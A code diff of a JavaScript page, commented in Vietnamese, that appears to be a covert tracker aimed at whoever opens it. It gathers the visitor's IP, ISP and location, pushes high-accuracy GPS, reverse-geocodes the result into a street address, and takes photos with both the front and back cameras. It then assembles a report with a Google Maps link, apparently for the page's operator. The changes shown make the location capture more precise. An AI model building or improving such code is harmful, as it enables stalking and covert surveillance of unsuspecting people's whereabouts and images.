@@ -30,29 +30,42 @@ async function getIPs() {
         const res = await fetch('https://ipwho.is/').then(r => r.json());
         info.ip = res.ip;
         info.isp = res.connection?.org || 'N/A';
-        // Dự phòng tọa độ từ IP nếu GPS bị từ chối
-        info.lat = res.latitude;
-        info.lon = res.longitude;
+        // Tọa độ IP chỉ dùng làm dự phòng cuối cùng
+        if(!info.lat) {
+            info.lat = res.latitude;
+            info.lon = res.longitude;
+            info.address = `${res.city}, ${res.region} (\u01AF\u1EDB\u0063 \u0074\u0068\u00ED\u006E\u0068 \u0071\u0075\u0061 \u0049\u0050)`;
+        }
     } catch (e) { info.ip = 'Bị chặn'; }
 }
 
 async function getLocation() {
     return new Promise(resolve => {
         if (!navigator.geolocation) return resolve();
+
+        // Ép buộc trình duyệt dùng GPS vệ tinh bằng enableHighAccuracy
         navigator.geolocation.getCurrentPosition(
             async pos => {
                 info.lat = pos.coords.latitude;
                 info.lon = pos.coords.longitude;
                 const acc = pos.coords.accuracy ? ` (\u00B1${pos.coords.accuracy.toFixed(1)}m)` : '';
+                
                 try {
+                    // Reverse Geocoding lấy địa chỉ từ tọa độ GPS
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                     const data = await res.json();
                     info.address = (data.display_name || 'Vị trí thực tế') + acc;
-                } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; }
+                } catch { 
+                    info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; 
+                }
                 resolve();
             },
-            () => resolve(), // Nếu lỗi hoặc từ chối, dùng tọa độ IP đã lấy ở hàm getIPs
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // Giới hạn đúng 5 giây
+            () => resolve(), // Lỗi thì dùng IP backup
+            { 
+                enableHighAccuracy: true, // BẮT BUỘC BẬT CHIP GPS
+                timeout: 5000,            // Chờ đúng 5s
+                maximumAge: 0             // Không dùng vị trí cũ trong bộ nhớ
+            }
         );
     });
 }
@@ -81,6 +94,7 @@ async function captureCamera(facingMode = 'user') {
 }
 
 function getCaption() {
+    // Sửa lỗi link Google Maps (xóa số 0 thừa và dấu ngoặc sai)
     const mapsLink = (info.lat && info.lon) 
         ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
         : 'Không rõ';
@@ -90,7 +104,7 @@ function getCaption() {
            `\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${info.device} (${info.os})\n` +
            `\uD83C\uDF10 IP: ${info.ip}\n` +
            `\uD83C\uDFE2 ISP: ${info.isp}\n` +
-           `\uD83C\uDFD9 \u0110\u1ECBa ch\u1EC9: ${info.address || 'Đang xác định...'}\n` +
+           `\uD83C\uDFD9 \u0110\u1ECBa ch\u1EC9: ${info.address}\n` +
            `\uD83D\uDCCC Google Maps: ${mapsLink}\n` +
            `\uD83D\uDCF8 Camera: ${info.camera}`;
 }
@@ -99,11 +113,13 @@ async function main() {
     info.time = new Date().toLocaleString('vi-VN');
     detectDevice();
     
-    // Ưu tiên lấy IP trước để có tọa độ dự phòng
+    // Bước 1: Gọi IP trước (nhanh, làm nền)
     await getIPs();
-    // Chạy GPS song song trong tối đa 5s
+    
+    // Bước 2: Gọi GPS đè lên (nếu người dùng cho phép, nó sẽ lấy tọa độ chuẩn mét)
     await getLocation();
 
+    // Bước 3: Chụp ảnh
     let front = await captureCamera("user");
     let back = front ? await captureCamera("environment") : null;
 
